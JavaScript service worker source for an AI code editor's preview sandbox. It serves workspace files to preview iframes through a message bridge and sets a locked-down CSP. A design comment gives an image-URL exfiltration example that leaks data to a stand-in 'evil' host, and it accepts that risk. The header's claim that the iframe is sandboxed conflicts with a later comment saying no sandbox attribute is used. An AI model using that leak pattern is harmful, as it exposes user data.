/**
 * AI Editor — Preview Service Worker (1.22.0).
 *
 * Tier 1 of the in-editor preview & verify stack
 * (`docs/DESIGN-preview.md`). Intercepts fetches under `/js/preview/`
 * (the SW's default scope) and serves workspace files via a postMessage
 * round-trip to the page-side bridge (`js/preview/sw-bridge.js`).
 *
 * **The trust boundary lives here.** Workspace JS that the LLM authored
 * runs in iframes loaded from this scope. Each synthesized Response
 * sets a strict CSP that locks the iframe to `default-src 'self'`,
 * blocks outbound network, and disallows third-party JS. Combined with
 * the host page's `sandbox="allow-scripts"` (no `allow-same-origin`)
 * iframe attribute, the iframe runs at a null origin with no reach
 * into the editor's State / localStorage / cookies.
 *
 * URL shape served:  `/js/preview/<serverId>/<workspace-relative-path>`
 *   - `<serverId>` is opaque to the SW; the bridge ignores it (the
 *     workspace is implicit from `State.currentProject`). It exists in
 *     the URL so the slide-over can map iframes back to logical
 *     server entries and so multiple previews can coexist within the
 *     same SW scope.
 *   - `<workspace-relative-path>` is what the bridge resolves via
 *     `Git.getFile`.
 *
 * No editor module is imported here — the SW must stay the boundary's
 * one reach-back surface. All editor data flows over `MessageChannel`
 * via the bridge, never via `import`.
 *
 * @since 1.22.0
 */

// SCOPE_PREFIX derives from the SW's own location so it honors
// BASE_PATH (root, /dev, /test, etc.). At root deploy this is
// `/js/preview/`; at /dev it's `/dev/js/preview/`. The hardcoded
// `/js/preview/` constant this replaced silently broke every non-root
// deployment — gitea#338 dogfood evidence.
//
// `self.location.pathname` is the SW script's URL pathname,
// e.g. `/dev/js/preview/service-worker.js`; we trim the script
// filename to get the directory the scope lives at.
const SCOPE_PREFIX = self.location.pathname.replace(/[^/]*$/, '');
const SW_SCRIPT_PATH = self.location.pathname;
const REQUEST_TIMEOUT_MS = 10000;

self.addEventListener('install', (event) => {
    // Take over old SWs immediately — the editor is the only thing
    // registering this file, and a stale SW serving stale workspace
    // files would be more confusing than useful.
    //
    // `event.waitUntil(self.skipWaiting())` (rather than bare
    // `self.skipWaiting()`) is load-bearing: Firefox's stricter SW
    // lifecycle surfaces a bare `skipWaiting()` as
    // *"encountered an error during installation"* when the install
    // promise resolves before the skip-waiting transition lands. Chrome
    // tolerates the bare call; Firefox does not. Verified via the
    // 2026-05-08 dogfood run on editor.gobha.ai (gitea#338).
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
    // `clients.claim()` can reject when no clients are in scope yet
    // (the iframe hasn't loaded). The activation should still succeed —
    // the SW takes control of subsequent navigations regardless.
    event.waitUntil(
        self.clients.claim().catch((err) => {
            console.warn('[preview-sw] clients.claim() rejected (non-fatal):', err);
        })
    );
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    if (url.origin !== self.location.origin) return;
    if (!url.pathname.startsWith(SCOPE_PREFIX)) return;

    // The SW file itself sits at `<SCOPE_PREFIX>service-worker.js` —
    // the SW never intercepts its own load, but defensively skip any
    // request whose pathname matches the SW URL.
    if (url.pathname === SW_SCRIPT_PATH) return;

    // Strip the scope + serverId from the pathname to get the
    // workspace-relative path. URL shape is
    // /js/preview/<serverId>/<path...>; if the URL lacks a serverId we
    // 404 — only the host registers preview iframes.
    const tail = url.pathname.slice(SCOPE_PREFIX.length);
    const slashIdx = tail.indexOf('/');
    if (slashIdx < 0) {
        // No <serverId>/<path> — could be a stray nav at /js/preview/
        // itself. Pass through (no respondWith) — let the network 404.
        return;
    }
    const serverId = tail.slice(0, slashIdx);
    // Resolve directory navigations (trailing slash, e.g. `forge-defense/`
    // from a launcher link) to `<dir>/index.html` — what every static
    // server does. Empty path also falls back to `index.html`. The
    // gitea#338 dogfood surfaced this as "click a game and it asks me
    // to download" — the browser was trying to render a directory
    // listing or 404 envelope as a file.
    let path = tail.slice(slashIdx + 1);
    if (!path || path.endsWith('/')) {
        path = (path || '') + 'index.html';
    }
    if (!serverId) return;

    // gitea#338 dogfood instrumentation: broadcast a debug ping to ALL
    // window clients (controlled or not) so the editor's bridge handler
    // sees the SW intercept event even when client identification or
    // postMessage routing drops the request. Helps prove "fetch handler
    // fired" vs "didn't fire" in user-reported issues. The broadcast
    // fires before respondWith so it's not blocked on bridge resolution.
    _broadcastDebug({ stage: 'fetch-intercept', path, serverId, mode: event.request.mode, destination: event.request.destination });

    event.respondWith(_servePreview(event, path));
});

/**
 * Broadcast a debug message to every same-origin window client. Used
 * to surface SW-side state in the editor's main console (the SW's own
 * console is reachable only via DevTools → Application → Service
 * Workers → click the SW). Best-effort — silently swallows errors.
 *
 * @param {object} payload
 */
async function _broadcastDebug(payload) {
    try {
        const all = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
        for (const c of all) {
            try { c.postMessage({ type: 'preview:debug', ...payload }); } catch { /* swallow */ }
        }
    } catch { /* swallow */ }
}

/**
 * Resolve a preview request by asking the page-side bridge for the
 * file's content, then synthesize a Response with the right MIME +
 * the locked-down CSP.
 *
 * @param {FetchEvent} event
 * @param {string} path
 * @returns {Promise<Response>}
 */
async function _servePreview(event, path) {
    const all = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
    _broadcastDebug({
        stage: 'serve-preview-start',
        path,
        clientCount: all.length,
        clients: all.map(c => ({ url: c.url, frameType: c.frameType, type: c.type })),
    });
    const client = await _findHostClient(event);
    if (!client) {
        _broadcastDebug({ stage: 'no-host-client', path });
        return _errorResponse(503, 'No editor client available to resolve preview path.');
    }
    _broadcastDebug({ stage: 'host-client-picked', path, clientUrl: client.url });
    let payload;
    try {
        payload = await _askBridge(client, path);
    } catch (err) {
        _broadcastDebug({ stage: 'bridge-error', path, error: err && err.message ? err.message : String(err) });
        return _errorResponse(500, `Bridge error: ${err && err.message ? err.message : String(err)}`);
    }
    _broadcastDebug({ stage: 'bridge-replied', path, ok: !!(payload && payload.ok), status: payload?.status, ext: payload?.ext });
    if (!payload || payload.ok !== true) {
        const status = payload && Number.isInteger(payload.status) ? payload.status : 500;
        const message = payload && payload.error ? String(payload.error) : 'Failed to resolve preview path';
        return _errorResponse(status, message);
    }
    const mime = _mimeFromExt(payload.ext);
    // CSP design (gitea#338 — relaxed for visual resources after the
    // dogfood pass surfaced "preview-confuses-the-model" noise):
    //
    //   - script-src     'self' 'unsafe-inline'    — workspace JS only,
    //     no external scripts. Load-bearing: blocks remote code
    //     execution. Inline allowed because workspace HTML often
    //     contains inline <script> tags.
    //   - connect-src    'self'                    — no fetch/XHR/WebSocket
    //     to external endpoints. Load-bearing: blocks JS-driven
    //     exfiltration. Workspace JS cannot phone home.
    //   - style-src      'self' 'unsafe-inline' https:
    //   - font-src       'self' data: https:
    //   - img-src        'self' data: https:
    //     Permissive for visual resources so games using Google Fonts
    //     / CDN sprites / etc. render without CSP-violation noise in
    //     the console — that noise is what was going to confuse Tier 2
    //     `preview_console_logs` consumers (LLM reads it, thinks the
    //     game is broken). Residual concern: `<img src="https://evil/
    //     ?leak=...">` is a low-bandwidth side-channel for exfil via
    //     GET URL params; accepted for Tier 1 single-origin mode where
    //     the iframe already shares `window.parent` reach (no sandbox
    //     attr, see preview-host.js). Multi-origin deploy with a real
    //     subdomain restores the iframe sandbox boundary; this CSP is
    //     belt-and-braces, not the load-bearing layer.
    //   - frame-ancestors 'self'                   — only the editor
    //     can frame the preview; no third-party embedding.
    const headers = new Headers({
        'Content-Type': mime,
        'Content-Security-Policy':
            "default-src 'self'; " +
            "connect-src 'self'; " +
            "img-src 'self' data: https:; " +
            "style-src 'self' 'unsafe-inline' https:; " +
            "font-src 'self' data: https:; " +
            "script-src 'self' 'unsafe-inline'; " +
            "frame-ancestors 'self';",
        'X-Content-Type-Options': 'nosniff',
        'Cache-Control': 'no-store',
    });
    // Bridge returns `body: ArrayBuffer` (transferable). Falls back to
    // `content: string` for older bridge protocol — defensive only.
    const responseBody = payload.body || payload.content;
    return new Response(responseBody, { status: 200, headers });
}

/**
 * Pick a client to ask. Prefers the client whose URL resembles the
 * editor's main document (so the bridge — which lives on the editor
 * page — receives the message). Falls back to the first available
 * client if none look like the editor.
 *
 * @param {FetchEvent} event
 * @returns {Promise<WindowClient|null>}
 */
async function _findHostClient(event) {
    if (event.clientId) {
        const direct = await self.clients.get(event.clientId);
        if (direct) {
            // The clientId points at the iframe — its parent window is
            // the editor. Look up all clients and pick the one whose
            // pathname is NOT under SCOPE_PREFIX (i.e. the editor
            // document itself).
        }
    }
    const all = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
    let editor = null;
    for (const c of all) {
        const u = new URL(c.url);
        if (!u.pathname.startsWith(SCOPE_PREFIX)) {
            editor = /** @type {WindowClient} */ (c);
            break;
        }
    }
    return editor || (all.length > 0 ? /** @type {WindowClient} */ (all[0]) : null);
}

/**
 * Ask the bridge over a one-shot MessageChannel. Resolves with the
 * bridge's reply or rejects on timeout.
 *
 * @param {WindowClient} client
 * @param {string} path
 * @returns {Promise<any>}
 */
function _askBridge(client, path) {
    return new Promise((resolve, reject) => {
        const channel = new MessageChannel();
        const timer = setTimeout(() => {
            channel.port1.close();
            reject(new Error(`Bridge timeout after ${REQUEST_TIMEOUT_MS}ms`));
        }, REQUEST_TIMEOUT_MS);
        channel.port1.onmessage = (ev) => {
            clearTimeout(timer);
            channel.port1.close();
            resolve(ev.data);
        };
        client.postMessage({ type: 'preview:fetch', path }, [channel.port2]);
    });
}

/**
 * Map an extension to a MIME type. Best-effort; extensions outside the
 * map fall back to `application/octet-stream`. Aligned with the
 * extensions ai-editor's existing static-preview surface
 * (`js/secondary-pane.js:18`) recognizes plus the rest of the common
 * web subset.
 *
 * @param {string} ext
 * @returns {string}
 */
function _mimeFromExt(ext) {
    switch (ext) {
        case 'html':
        case 'htm':
            return 'text/html; charset=utf-8';
        case 'js':
        case 'mjs':
            return 'text/javascript; charset=utf-8';
        case 'css':
            return 'text/css; charset=utf-8';
        case 'json':
            return 'application/json; charset=utf-8';
        case 'svg':
            return 'image/svg+xml';
        case 'png': return 'image/png';
        case 'jpg':
        case 'jpeg': return 'image/jpeg';
        case 'gif': return 'image/gif';
        case 'webp': return 'image/webp';
        case 'ico': return 'image/x-icon';
        case 'wasm': return 'application/wasm';
        case 'txt':
        case 'md':
        case 'markdown':
            return 'text/plain; charset=utf-8';
        case 'woff': return 'font/woff';
        case 'woff2': return 'font/woff2';
        case 'ttf': return 'font/ttf';
        case 'otf': return 'font/otf';
        default:
            return 'application/octet-stream';
    }
}

/**
 * Synthesize an error Response. Plain text — kept short so it fits in
 * the iframe without scrolling and the model reading `preview_logs`
 * (Tier 2) gets a legible message.
 *
 * @param {number} status
 * @param {string} message
 * @returns {Response}
 */
function _errorResponse(status, message) {
    return new Response(`Preview error ${status}: ${message}`, {
        status,
        headers: {
            'Content-Type': 'text/plain; charset=utf-8',
            'Cache-Control': 'no-store',
        },
    });
}
